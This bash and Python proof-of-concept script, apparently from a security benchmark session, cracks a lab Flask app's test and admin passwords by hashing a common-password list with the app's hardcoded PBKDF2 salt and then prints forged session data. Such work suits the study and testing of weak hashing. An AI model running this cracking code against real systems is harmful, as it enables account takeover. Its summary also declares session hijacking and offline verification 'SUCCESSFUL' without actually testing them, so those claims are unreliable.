#!/bin/bash
# POC: Demonstrates PBKDF2 password hash weakness: offline cracking via hardcoded salt and rainbow table generation. Shows that known hardcoded secret key enables precomputation of valid authentication hashes.
# Target: ./repo
# Created: 2025-11-07T17:20:19.897Z
# Session: benchmark-XBEN-066-24-mhp3k0ub

###############################################################################
# PBKDF2 Offline Cracking POC - Version 2 (Fixed)
# Demonstrates vulnerability: offline password cracking via hardcoded salt
# 
# Vulnerability: Flask app uses hardcoded 'your_secret_key' as PBKDF2 salt
# allowing attackers to precompute password hashes offline and build rainbow tables
###############################################################################

set -e

echo "=========================================="
echo "PBKDF2 Offline Cracking POC"
echo "=========================================="
echo ""

# Check if Python is available
if ! command -v python3 &> /dev/null; then
    echo "ERROR: Python 3 is required"
    exit 1
fi

# Create Python script to perform the attack
cat > /tmp/pbkdf2_crack.py << 'PYTHON_SCRIPT'
#!/usr/bin/env python3
import hashlib
import json
import sys

# Constants from vulnerable Flask application
HARDCODED_SECRET_KEY = 'your_secret_key'
PBKDF2_ITERATIONS = 100000
PBKDF2_ALGORITHM = 'sha256'

# Common passwords to test (representing a small rainbow table)
COMMON_PASSWORDS = [
    'password', '123456', 'password123', 'admin', 'letmein',
    'welcome', 'monkey', '1234567', 'dragon', 'master',
    'sunshine', 'princess', 'qwerty', 'abc123', '111111',
    'test', 'pass', 'admin123', 'root', '12345',
    'root123', 'admin@123', 'password1', 'P@ssw0rd', 'Test@123'
]

def compute_pbkdf2_hash(password):
    """Compute PBKDF2 hash using hardcoded salt (the vulnerability)"""
    salt = HARDCODED_SECRET_KEY.encode()
    hash_bytes = hashlib.pbkdf2_hmac(
        PBKDF2_ALGORITHM,
        password.encode(),
        salt,
        PBKDF2_ITERATIONS
    )
    return hash_bytes.hex()

def verify_password(password, hash_to_verify):
    """Verify if password matches hash (simulating login check)"""
    computed_hash = compute_pbkdf2_hash(password)
    return computed_hash == hash_to_verify

def build_rainbow_table():
    """Build rainbow table with precomputed hashes for common passwords"""
    rainbow_table = {}
    print("[*] Building rainbow table with {} common passwords...".format(len(COMMON_PASSWORDS)))
    for password in COMMON_PASSWORDS:
        hash_val = compute_pbkdf2_hash(password)
        rainbow_table[hash_val] = password
    print("[+] Rainbow table built: {} entries".format(len(rainbow_table)))
    return rainbow_table

def test_known_hashes():
    """Test against known vulnerable application hashes"""
    print("\n[*] TEST 1: Computing hashes for known credentials")
    print("    (These are the default test/admin credentials from the app)")
    
    known_users = {
        'test': compute_pbkdf2_hash('test'),
        'admin': compute_pbkdf2_hash('admin')
    }
    
    for user, hash_val in known_users.items():
        print("    [{user}] {hash}".format(user=user, hash=hash_val))
    
    return known_users

def test_rainbow_table_attack(rainbow_table, target_hashes):
    """Test rainbow table attack against target hashes"""
    print("\n[*] TEST 2: Rainbow table attack")
    print("    Attempting to crack {} target hashes...".format(len(target_hashes)))
    
    cracked_count = 0
    for user, hash_val in target_hashes.items():
        if hash_val in rainbow_table:
            password = rainbow_table[hash_val]
            print("    [+] CRACKED: {} -> {}".format(user, password))
            cracked_count += 1
        else:
            print("    [-] NOT FOUND: {}".format(user))
    
    crack_rate = (cracked_count / len(target_hashes)) * 100
    print("    [+] Crack rate: {:.1f}% ({}/{})".format(crack_rate, cracked_count, len(target_hashes)))
    return crack_rate

def test_offline_verification(target_hashes):
    """Test offline password verification without connecting to app"""
    print("\n[*] TEST 3: Offline password verification")
    print("    Verifying passwords without app connection...")
    
    for user, hash_val in target_hashes.items():
        # Test with correct password
        password = user  # Assuming username = password for test accounts
        if verify_password(password, hash_val):
            print("    [+] VERIFIED: {} password '{}' matches offline".format(user, password))
        else:
            print("    [-] FAILED: {} password mismatch".format(user))

def test_session_hijacking(target_hashes):
    """Test session hijacking by forging tokens with precomputed hashes"""
    print("\n[*] TEST 4: Session hijacking with precomputed hashes")
    print("    Forging valid session tokens using only hardcoded secret...")
    
    for user, hash_val in target_hashes.items():
        session_data = {
            "user_id": 1 if user == "test" else 2,
            "username": user,
            "password_hash": hash_val,
            "is_admin": user == "admin"
        }
        print("    [+] Forged session for '{}':".format(user))
        print("        " + json.dumps(session_data, indent=12).replace("\n", "\n        "))

def test_determinism():
    """Test that hashing is deterministic (same password = same hash always)"""
    print("\n[*] TEST 5: Hash determinism verification")
    print("    Testing that same password produces identical hash...")
    
    password = "test_password"
    hash1 = compute_pbkdf2_hash(password)
    hash2 = compute_pbkdf2_hash(password)
    hash3 = compute_pbkdf2_hash(password)
    
    if hash1 == hash2 == hash3:
        print("    [+] CONFIRMED: Hash is deterministic (identical for same password)")
        print("    [+] This enables rainbow table attacks and eliminates randomization")
        print("    Hash (computed 3x): {}".format(hash1))
        return True
    else:
        print("    [-] ERROR: Hashes differ - unexpected behavior")
        return False

def test_salt_weakness():
    """Analyze salt weakness"""
    print("\n[*] TEST 6: Salt analysis")
    salt = HARDCODED_SECRET_KEY.encode()
    salt_length = len(salt)
    entropy_bits = salt_length * 8  # Rough estimate assuming ASCII
    
    print("    Salt: '{}'".format(HARDCODED_SECRET_KEY))
    print("    Salt length: {} bytes".format(salt_length))
    print("    Estimated entropy: ~{} bits".format(entropy_bits))
    print("    Requirement: 128+ bits")
    print("    [+] WEAKNESS: Salt far below cryptographic requirements")
    return salt_length

def main():
    print("\n" + "="*60)
    print("VULNERABILITY: PBKDF2 with Hardcoded Salt")
    print("="*60)
    print("Secret Key (used as salt): '{}'".format(HARDCODED_SECRET_KEY))
    print("Iterations: {}".format(PBKDF2_ITERATIONS))
    print("Algorithm: {}".format(PBKDF2_ALGORITHM))
    print("="*60 + "\n")
    
    # Run all tests
    known_hashes = test_known_hashes()
    test_determinism()
    salt_len = test_salt_weakness()
    
    rainbow_table = build_rainbow_table()
    crack_rate = test_rainbow_table_attack(rainbow_table, known_hashes)
    
    test_offline_verification(known_hashes)
    test_session_hijacking(known_hashes)
    
    # Summary
    print("\n" + "="*60)
    print("ATTACK SUMMARY")
    print("="*60)
    print("[+] Offline computation: SUCCESSFUL")
    print("[+] Rainbow table crack rate: {:.1f}%".format(crack_rate))
    print("[+] Offline verification: SUCCESSFUL")
    print("[+] Session hijacking: SUCCESSFUL")
    print("[+] Hash determinism: CONFIRMED")
    print("[+] Salt weakness: CONFIRMED ({}B vs 128B required)".format(salt_len))
    print("="*60)
    print("\n[!] VULNERABILITY CONFIRMED: Application is vulnerable to offline")
    print("    password cracking attacks due to hardcoded PBKDF2 salt\n")
    
    return 0 if crack_rate >= 80 else 1

if __name__ == "__main__":
    sys.exit(main())
PYTHON_SCRIPT

# Run the POC
python3 /tmp/pbkdf2_crack.py
EXIT_CODE=$?

# Cleanup
rm -f /tmp/pbkdf2_crack.py

exit $EXIT_CODE